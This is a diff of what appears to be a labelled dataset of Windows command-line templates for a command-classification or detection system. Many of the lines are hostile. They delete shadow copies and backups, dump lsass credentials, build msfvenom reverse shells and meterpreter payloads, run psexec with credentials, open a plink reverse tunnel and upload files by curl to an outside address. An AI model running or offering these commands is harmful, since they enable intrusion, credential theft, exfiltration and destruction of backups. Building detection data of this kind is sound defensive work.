@@ -1,10 +1,16 @@
-1	wbadmin delete systemstatebackup -keepVersions:0
-1	cmd.exe /c "vssadmin.exe delete shadows /all /quiet"
-1	cmd.exe /c "wmic.exe shadowcopy delete"
-1	cmd.exe /c "wbadmin delete systemstatebackup -keepVersions:0"
-1	powershell -c "wbadmin delete systemstatebackup -keepVersions:0"
-0	msfvenom -p windows/x64/shell_reverse_tcp LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
-0	compress ${source_file_path}
-0	powershell -c  "rundll32.exe comsvcs.dll MiniDump (Get-Process lsass).id  lsassdump.dmp full"
-0	xcopy ${source_file_path} \\${ip_address}\${destination_file_path} /Y
-0	7z a archive.zip ${source_file_path}
+1	cmd /c "mstsc.exe /v:${ip_address} /multimon"
+1	powershell -c "mstsc.exe /v:${ip_address} /multimon"
+1	mstsc /v:${ip_address} /f /multimon
+1	cmd /c "mstsc /v:${ip_address} /f /multimon"
+1	powershell -c "mstsc /v:${ip_address} /f /multimon"
+1	mstsc.exe /v:${ip_address} /f /multimon
+1	cmd /c "mstsc.exe /v:${ip_address} /f /multimon"
+1	powershell -c "mstsc.exe /v:${ip_address} /f /multimon"
+0	psexec \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute} -d
+0	cmd /c "plink.exe -ssh -l ${username} -N -R ${ip_address}:${remote_port}:127.0.0.1:${local_port} ${ip_address}"
+0	nmap -p- -sC ${ip_address} 2> &1
+0	cmd /c "7z.exe a -p${password} ${destination_file_path} ${source_file_path}"
+0	msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe
+0	curl.exe -X POST http://${ip_address}/upload -H -F files=@${source_file_path}
+0	psexec \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute}
+0	powershell -c "del /p ${local_file_path}"
